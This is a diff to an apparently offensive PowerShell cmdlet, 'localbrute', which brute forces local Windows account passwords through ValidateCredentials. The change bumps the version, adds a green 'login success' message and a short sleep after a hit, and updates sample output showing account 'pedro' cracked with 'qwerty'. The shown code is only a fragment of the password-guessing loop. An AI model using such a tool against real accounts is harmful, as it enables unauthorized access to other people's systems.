@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (18363) x64 bits
    Required Dependencies: none
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.0.1
+   PS cmdlet Dev version: v1.0.2
 
 .DESCRIPTION
    This CmdLet brute forces user account password with the help of native
@@ -30,6 +30,8 @@
    DEBUG: trying password [1]: pedro
    DEBUG: trying password [2]: s3cr3t
    DEBUG: trying password [3]: qwerty
+   DEBUG: login success @(pedro=>qwerty)
+
    Attempt StartTime EndTime  Account Password
    ------- --------- -------  ------- --------
    3       18:26:43  18:27:11 pedro   qwerty
@@ -59,6 +61,8 @@ Function localbrute {
       If($debug){echo "DEBUG: trying password [${i}]: $p"}
       If($a.ValidateCredentials($u,$p)){
         echo "${u}:${d}:True:${p}" >> localbrute.state
+        Write-Host "DEBUG: login success @($user=>$p)" -ForegroundColor Green -BackgroundColor Black
+        Start-Sleep -Seconds 1
 
         ## Create Data Table for output
         $TimeStampEnd = Get-Date -format "HH:mm:ss"
